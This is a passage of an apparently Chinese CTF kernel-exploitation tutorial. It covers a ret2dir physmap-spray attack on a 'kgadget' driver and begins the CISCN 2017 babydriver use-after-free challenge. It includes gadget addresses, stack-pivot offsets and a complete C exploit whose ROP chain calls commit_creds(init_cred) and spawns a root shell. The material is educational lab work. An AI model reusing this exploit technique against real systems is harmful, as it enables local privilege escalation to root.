class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>	<br>	    cat $<span class="hljs-number">1</span><br>	    exit <span class="hljs-number">0</span><br>	&#125;<br>	<br>	try_decompress()<br>	&#123;<br>	    <span class="hljs-comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br>	    <span class="hljs-comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br>	<br>	    <span class="hljs-comment"># Try to find the header ($1) and decompress from here</span><br>	    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> `tr <span class="hljs-string">&quot;$1\n$2&quot;</span> <span class="hljs-string">&quot;\n$2=&quot;</span> &lt; <span class="hljs-string">&quot;$img&quot;</span> | grep -abo <span class="hljs-string">&quot;^$2&quot;</span>`<br>	    do<br>	        pos=$&#123;pos%%:*&#125;<br>	        tail -c+$pos <span class="hljs-string">&quot;$img&quot;</span> | $<span class="hljs-number">3</span> &gt; $tmp <span class="hljs-number">2</span>&gt; /dev/null<br>	        check_vmlinux $tmp<br>	    done<br>	&#125;<br>	<br>	<span class="hljs-comment"># Check invocation:</span><br>	me=$&#123;<span class="hljs-number">0</span><span class="hljs-comment">##*/&#125;</span><br>	img=$<span class="hljs-number">1</span><br>	<span class="hljs-keyword">if</span>  [ $<span class="hljs-comment"># -ne 1 -o ! -s &quot;$img&quot; ]</span><br>	then<br>	    echo <span class="hljs-string">&quot;Usage: $me &lt;kernel-image&gt;&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br>	    exit <span class="hljs-number">2</span><br>	fi<br>	<br>	<span class="hljs-comment"># Prepare temp files:</span><br>	tmp=$(mktemp /tmp/vmlinux-XXX)<br>	trap <span class="hljs-string">&quot;rm -f $tmp&quot;</span> <span class="hljs-number">0</span><br>	<br>	<span class="hljs-comment"># That didn&#x27;t work, so retry after decompression.</span><br>	try_decompress <span class="hljs-string">&#x27;\037\213\010&#x27;</span> xy    gunzip<br>	try_decompress <span class="hljs-string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz<br>	try_decompress <span class="hljs-string">&#x27;BZh&#x27;</span>          xy    bunzip2<br>	try_decompress <span class="hljs-string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma<br>	try_decompress <span class="hljs-string">&#x27;\211\114\132&#x27;</span> xy    <span class="hljs-string">&#x27;lzop -d&#x27;</span><br>	try_decompress <span class="hljs-string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="hljs-string">&#x27;lz4 -d&#x27;</span><br>	try_decompress <span class="hljs-string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd<br>	<br>	<span class="hljs-comment"># Finally check for uncompressed images or objects:</span><br>	check_vmlinux $img<br>	<br>	<span class="hljs-comment"># Bail out:</span><br>	echo <span class="hljs-string">&quot;$me: Cannot find vmlinux.&quot;</span> &gt;&amp;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>



<p>另外一种方法就是使用比较完善的<code>vmlinux-to-elf</code>，具体github地址如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a></p>
</blockquote>
<p>下)面我们获取两个函数的地址：</p>
<pre><code class="hljs">ffffffff810c92e0 &lt;commit_creds&gt;:
ffffffff810c9540 &lt;prepare_kernel_cred&gt;:
</code></pre>
<p>大家应该还记得咱们提权的方法吧，那就是想办法执行<code>commit_creds(prepare_kernel_cred(NULL))</code>,将内核权限赋予新进程</p>
<p>回顾我们上面的利用手法，我们需要再用户程序申请大量的内存来增加我们再内核态找到对应物理内存的几率，因此我们再C用户程序种使用<code>mmap</code>函数来进行匿名内存映射：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">map_spray</span>[<span class="hljs-number">0</span>] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>

<p>现在我们还需要找到一些gadget来进行我们的利用</p>
<p>如同之前内核ROP，我们同样需要找到<code>swapgs</code>、<code>iretq</code>等语句,但是本题的启动脚本我们可以发现开启了kpti，这导致我们在构造返回用户态的时候需要修改cr3寄存器，也就是改一下我们的页表地址，因此我们可以利用下面我们获得到的一个内核函数，该函数就包括了咱们<code>swapgs;ireq;</code>这样的指令，但是这里注意，整个函数可以用下面的形式来表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">swapgs;<br>pop;<br>pop;<br>iretq;<br></code></pre></td></tr></table></figure>

<p>所以说我们构造ROP链的时候需要加两个padding：）</p>
<p><code>swapgs_restoer_regs_and_return_to_usermode</code>,如下：</p>
<pre><code class="hljs">.text:FFFFFFFF81C00FB0                               public swapgs_restore_regs_and_return_to_usermode
.text:FFFFFFFF81C00FB0                               swapgs_restore_regs_and_return_to_usermode proc near
.text:FFFFFFFF81C00FB0                                                                       ; CODE XREF: ret_from_fork+15↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+54↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+65↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+74↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+87↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+94↑j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_64_after_hwframe+A3↑j
.text:FFFFFFFF81C00FB0                                                                       ; error_return+E↓j
.text:FFFFFFFF81C00FB0                                                                       ; asm_exc_nmi+93↓j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSENTER_compat_after_hwframe+4F↓j
.text:FFFFFFFF81C00FB0                                                                       ; entry_SYSCALL_compat_after_hwframe+47↓j
.text:FFFFFFFF81C00FB0                                                                       ; entry_INT80_compat+85↓j
.text:FFFFFFFF81C00FB0                                                                       ; DATA XREF: print_graph_irq+D↑o
.text:FFFFFFFF81C00FB0                                                                       ; print_graph_entry+59↑o
.text:FFFFFFFF81C00FB0 90                            nop                                     ; Alternative name is &#39;__irqentry_text_end&#39;
.text:FFFFFFFF81C00FB1 90                            nop
.text:FFFFFFFF81C00FB2 90                            nop
.text:FFFFFFFF81C00FB3 90                            nop
.text:FFFFFFFF81C00FB4 90                            nop
.text:FFFFFFFF81C00FB5 41 5F                         pop     r15
.text:FFFFFFFF81C00FB7 41 5E                         pop     r14
.text:FFFFFFFF81C00FB9 41 5D                         pop     r13
.text:FFFFFFFF81C00FBB 41 5C                         pop     r12
.text:FFFFFFFF81C00FBD 5D                            pop     rbp
.text:FFFFFFFF81C00FBE 5B                            pop     rbx
.text:FFFFFFFF81C00FBF 41 5B                         pop     r11
.text:FFFFFFFF81C00FC1 41 5A                         pop     r10
.text:FFFFFFFF81C00FC3 41 59                         pop     r9
.text:FFFFFFFF81C00FC5 41 58                         pop     r8
.text:FFFFFFFF81C00FC7 58                            pop     rax
.text:FFFFFFFF81C00FC8 59                            pop     rcx
.text:FFFFFFFF81C00FC9 5A                            pop     rdx
.text:FFFFFFFF81C00FCA 5E                            pop     rsi                             ;直到这里可以发现咱们是在主动恢复一些当时中断保存的pt_regs寄存器组
.text:FFFFFFFF81C00FCB 48 89 E7                      mov     rdi, rsp                        ;我们可以跳过这些寄存器直接开整
.text:FFFFFFFF81C00FCE 65 48 8B 24 25 04 60 00 00    mov     rsp, gs:qword_6004
.text:FFFFFFFF81C00FD7 FF 77 30                      push    qword ptr [rdi+30h]
.text:FFFFFFFF81C00FDA FF 77 28                      push    qword ptr [rdi+28h]
.text:FFFFFFFF81C00FDD FF 77 20                      push    qword ptr [rdi+20h]
.text:FFFFFFFF81C00FE0 FF 77 18                      push    qword ptr [rdi+18h]
.text:FFFFFFFF81C00FE3 FF 77 10                      push    qword ptr [rdi+10h]
.text:FFFFFFFF81C00FE6 FF 37                         push    qword ptr [rdi]
.text:FFFFFFFF81C00FE8 50                            push    rax
.text:FFFFFFFF81C00FE9 EB 43                         jmp     short loc_FFFFFFFF81C0102E
...........
.text:FFFFFFFF81C0102E                               loc_FFFFFFFF81C0102E:                   ; CODE XREF: swapgs_restore_regs_and_return_to_usermode+39↑j
.text:FFFFFFFF81C0102E 58                            pop     rax                             ;这里pop了两个值，所以需要在ROP种填充
.text:FFFFFFFF81C0102F 5F                            pop     rdi
.text:FFFFFFFF81C01030 0F 01 F8                      swapgs
.text:FFFFFFFF81C01033 FF 25 47 8D E4 00             jmp     cs:off_FFFFFFFF82A49D80
</code></pre>
<p>从这个名字也可以看出他是为了在中断例程结束后，从内核态返回用户态时所调用的函数，他首先会pop大量的寄存器来还原当时的环境，这里我们并不需要，所以我们需要的开始执行的地址就从<code>0xFFFFFFFF81C00FCB</code>进行咱们的利用，从这力同样可以返回用户态，因此这就是我们所需要的。</p>
<p>这里还有一点就是该<code>vmlinux</code>中并没有发现<code>mov rdi rax;</code>的指令，因此我们实现<code>commit_creds(prepare_kernel_cred(NULL))</code>有点困难，因此我们要利用到一个小知识点，那就是内核运行过程中会存在一个结构体<code>init_cred</code>,他表示root权限的结构体，因此我们改为实现<code>commit_creds(init_cred)</code>,找到结果如下：</p>
<pre><code class="hljs">ffffffff810c9640:       f0 ff 05 b9 20 9a 01    lock inc DWORD PTR [rip+0x19a20b9]        # ffffffff82a6b700 &lt;init_cred&gt;
</code></pre>
<h2 id="4-利用步骤"><a href="#4-利用步骤" class="headerlink" title="4.利用步骤"></a>4.利用步骤</h2><p>一些基本的gadget找到后我们如何让程序运行呢，这里我们来梳理一下本题中的关键点：</p>
<ul>
<li><code>ioctl</code>系统调用会执行我们传入的函数指针，但是这里只能传递内核的函数指针，由于开启了SMAP&#x2F;SMEP所以会有访问控制</li>
<li>我们大量使用<code>mmap</code>映射了大片用户内存到物理内存上，并且以页为单位构造相同的ROP链，因此此时我们只需要传递<code>direct mapping</code>中的某一个内核地址，如果我们<code>mmap</code>分配的内存达到了一定量级理论上我们随机挑一个内存直接映射区地址，大概率会跳转到我们用户态构建的ROP链上</li>
<li>最后就是我们ROP的基础，让我们的链位于栈上，我们所构造的ROP链目前是改不了了，但我们可以利用栈迁移的知识，通过栈迁移跳转到目标ROP上进行稳定提权</li>
</ul>
<h2 id="5-栈迁移以及偏移计算"><a href="#5-栈迁移以及偏移计算" class="headerlink" title="5.栈迁移以及偏移计算"></a>5.栈迁移以及偏移计算</h2><p>总结过后我们目前最后的点那就是进行栈迁移，但是如何进行栈迁移呢<br>经过我们之前的分析我们知道，在调用ioctl后，函数首先会对于其中的某些寄存器进行赋值操作，此时能够被咱们使用的是r8,r9了（不过这里暂时不太清楚，难道说是因为前面的寄存器都需要参与<code>ioctl</code>接下来的函数操作，而其他的寄存器由不尽数相连，无法构成迁移ROP？）<br>总之我们到r8、r9寄存器中填充我们的ROP链，也就是利用如下指令</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure>
<p>我们通过在r9中填入指令，然后到r8当中填入我们所猜测的地址，这样就将栈迁移到了我们所构造的mmap映射到的物理内存了，然后就进行ROP<br>这里同样找到该指令的地址</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xffffffff811483d0</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span> <span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure>
<p>但是我们该如何执行到这里的指令呢，这里我们知道当我们进入内核态的时候，栈同时也会转移，并且内核态的栈会保存咱们用户态时寄存器的一些值，所以我们此时只需要将栈顶地址加上到达保存r9寄存器值得地址偏移就可以使得我们执行当时的指令了，这个具体偏移我们调试内核进行查找。<br>接下来我们先来查找一下kgadget的偏移，具体步骤在我之前的文章有讲解，也就是重新打包一下文件系统以及init脚本即可，链接如下：<br><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1706316-1-1.html">Linux内核PWN环境准备</a></p>
<p>然后我们开始调试内核查看偏移：<br>首先我们先利用ioctl系统调用执行我们猜测的地址，这里我们填入的是一个<code>add rsp val; ret</code>类型的指令，目的就是让该指令能ret到r9，而r9中存放的是咱们的<code>pop rsp; ret</code>指令，从而实现栈迁移，这里我们先到伪造的内存页的第一条指令打上断点：<br><img src="http://imgsrc.baidu.com/forum/pic/item/024f78f0f736afc3fefa26acf619ebc4b6451200.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里其实我填上的已经是找好的地址辣，但是目前我们假装不知道来寻找偏移，此时我们知道内核栈上应该存在6个<code>attrnba</code>的值，然后相隔1个又是他，这是attrnba师傅在写题的时候给的一个记号，如下：<br><img src="http://imgsrc.baidu.com/forum/pic/item/cefc1e178a82b901d843dafa368da9773812ef09.jpg" srcset="/img/loading.gif" lazyload><br>因此我们在此刻查找对应栈看是否有这样的布局，我们浅看一下发现果然如此！<br><img src="http://imgsrc.baidu.com/forum/pic/item/4e4a20a4462309f75b85b4db370e0cf3d6cad615.jpg" srcset="/img/loading.gif" lazyload><br>这里恰好跟我们预想的一致，而可以推算出r9寄存器值得地址保存在<code>0xffffc900001a7f98</code>，其实从旁边提示也知道是在这儿，而且底下得r8也确实是咱们猜测的地址，这里我们计算偏移也就是简单的减法：<code>0xffffc900001a7f98 - 0xffffc900001a7ed8 = 0xc0</code><br>可知我们需要找到的ROP的第一条语句应该是<code>add rsp, 0xc0</code>,可是一切并不如我们所料，在遍历vmlinux中并没发现这样的语句，但是我们找到了他的一个替代<br><code>add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret</code>,<br>这条指令也确实可以达成将栈增加0xc0的效果，然后之后就是正常的进行我们的rop链，这里我们构造ROP链是采取以下的方法<br><img src="http://imgsrc.baidu.com/forum/pic/item/d4628535e5dde71187d95b3fe2efce1b9c1661eb.jpg" srcset="/img/loading.gif" lazyload><br>最底下的ROP链也是咱们构造的执行相应函数提权的链条然后返回用户态。</p>
<h2 id="6-终极测试！"><a href="#6-终极测试！" class="headerlink" title="6.终极测试！"></a>6.终极测试！</h2><p>上面的步骤讲解完毕，我们就使用qemu进行测试<br><img src="http://imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfab213de27f18f8c5495ee7bff.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以发现我们猜测的physmap中的任意地址，大概率都可以完成提权操作</p>
<p>下面是exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810c92e0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> swapgs_pop2_retuser = <span class="hljs-number">0xFFFFFFFF81C00FB0</span> + <span class="hljs-number">0x1B</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> add_rsp = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> ret = <span class="hljs-number">0xffffffff810001fc</span>;<br><span class="hljs-type">long</span> page_size;     <span class="hljs-comment">//一页大小</span><br><span class="hljs-type">int</span> dev;<br><span class="hljs-type">size_t</span>* map_spray[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> guess;   <br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">makeROP</span><span class="hljs-params">(<span class="hljs-type">size_t</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br>​	<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>	<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span>&#123;<br>	  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>​	          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>​	          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>​	          <span class="hljs-string">&quot;pushf;&quot;</span><br>​	          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>​	        );<br>​	  info_log(<span class="hljs-string">&quot;Status has been saved.&quot;</span>);<br>​	&#125;<br>​	<br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">()</span>&#123;<br>	info_log(<span class="hljs-string">&quot;Ready to get root........&quot;</span>);<br>	<span class="hljs-keyword">if</span>(getuid())&#123;<br>	    error_log(<span class="hljs-string">&quot;Failed to get root!&quot;</span>);<br>	  &#125;<br>	  info_log(<span class="hljs-string">&quot;Root got!&quot;</span>);<br>	  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;	<br>	<span class="hljs-type">void</span> <span class="hljs-title function_">makeROP</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* space)</span>&#123;<br>	  <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>	  <span class="hljs-keyword">for</span>(; index &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); index++)<br>	    space[index] = add_rsp;<br>	  <span class="hljs-keyword">for</span>(; index &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); index++)<br>	    space[index] = ret;<br>	     space[index++] = pop_rdi_ret;<br>  space[index++] = init_cred;<br>  space[index++] = commit_creds;<br>  space[index++] = swapgs_pop2_retuser;<br>  space[index++] = <span class="hljs-number">0xDeadBeef</span>;<br>  space[index++] = <span class="hljs-number">0xdEADbEAF</span>;<br>  space[index++] = (<span class="hljs-type">size_t</span>)getShell;<br>  space[index++] = user_cs;<br>  space[index++] = user_rflags;<br>  space[index++] = user_sp;<br>  space[index++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  save_status();<br>  dev = open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">if</span>(dev &lt; <span class="hljs-number">0</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);<br>  &#125;<br>  page_size = sysconf(_SC_PAGESIZE);    <br>  info_log(<span class="hljs-string">&quot;Spraying physmap...&quot;</span>);<br><br>  map_spray[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  makeROP(map_spray[<span class="hljs-number">0</span>]); <br>  info_log(<span class="hljs-string">&quot;make done!&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">15000</span>; i++)&#123;<br>    map_spray[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!map_spray[i])&#123;<br>      error_log(<span class="hljs-string">&quot;Mmap Failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(map_spray[i], map_spray[<span class="hljs-number">0</span>], page_size);<br>  &#125;<br>  guess = <span class="hljs-number">0xFFFF888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>  info_log(<span class="hljs-string">&quot;Ready to ture to kernel.....&quot;</span>);<br>  __asm__(<span class="hljs-string">&quot;mov r15, 0xdeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r14, 0xceadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r13, 0xbeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r12, 0xaeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r11, 0xdeadbeef;&quot;</span><br>          <span class="hljs-string">&quot;mov r10, 0x123456;&quot;</span><br>          <span class="hljs-string">&quot;mov rbp, 0x1234567;&quot;</span><br>          <span class="hljs-string">&quot;mov rbx, 0x87654321;&quot;</span><br>          <span class="hljs-string">&quot;mov r9, pop_rsp_ret;&quot;</span><br>          <span class="hljs-string">&quot;mov r8, guess;&quot;</span><br>          <span class="hljs-string">&quot;mov rax, 0x10;&quot;</span><br>          <span class="hljs-string">&quot;mov rcx, 0x12344565;&quot;</span><br>          <span class="hljs-string">&quot;mov rdx, guess;&quot;</span><br>          <span class="hljs-string">&quot;mov rsi, 0x1bf52;&quot;</span><br>          <span class="hljs-string">&quot;mov rdi, dev;&quot;</span><br>          <span class="hljs-string">&quot;syscall;&quot;</span><br>        );<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>





<h1 id="三、Kernel-Heap-UAF"><a href="#三、Kernel-Heap-UAF" class="headerlink" title="三、Kernel Heap - UAF"></a>三、Kernel Heap - UAF</h1><h2 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h2><p>典中典题,大伙珍惜,从中可以学到很多结构体的认识</p>
<h3 id="1-题目逆向"><a href="#1-题目逆向" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>首先就是检查一些脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>                                                                                          <br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic <br>    panic=1&#x27; -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep <br>    -s<br><br></code></pre></td></tr></table></figure>

<ol>
<li>单核单线程</li>
<li>开启smep(执行禁止)</li>
<li>在kvm64 和 +smep的情况下会自动开启KPTI</li>
</ol>
<p>以及文件系统的启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br><br></code></pre></td></tr></table></figure>

<p>可以看到加载了一个<code>babydriver.ko</code>模块,大致就是需要逆这里<br>因此我们例行checksec一下</p>
<pre><code class="hljs">dawn@dawn-virtual-machine:~/KernelLearning/babydriver$ 
[*] &#39;/home/dawn/KernelLearning/babydriver/extract/lib/modules/4.4.72/babydriver.ko&#39;
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
</code></pre>
<p>然后就开始我们的逆向过程,如下:</p>
<p>babydriver_init没必要看,大致意思就是注册了一个<code>/dev/babydev</code>的设备,下面看fops</p>
<pre><code class="hljs">.data:00000000000008C0                               ; ===========================================================================
.data:00000000000008C0
.data:00000000000008C0                               ; Segment type: Pure data
.data:00000000000008C0                               ; Segment permissions: Read/Write
.data:00000000000008C0                               _data segment align_32 public &#39;DATA&#39; use64
.data:00000000000008C0                               assume cs:_data
.data:00000000000008C0                               ;org 8C0h
.data:00000000000008C0                               public fops
.data:00000000000008C0                               ; file_operations fops
.data:00000000000008C0 C0 09 00 00 00 00 00 00 00 00+fops file_operations &lt;offset __this_module, 0, offset babyread, offset babywrite, 0, 0, 0, 0, \
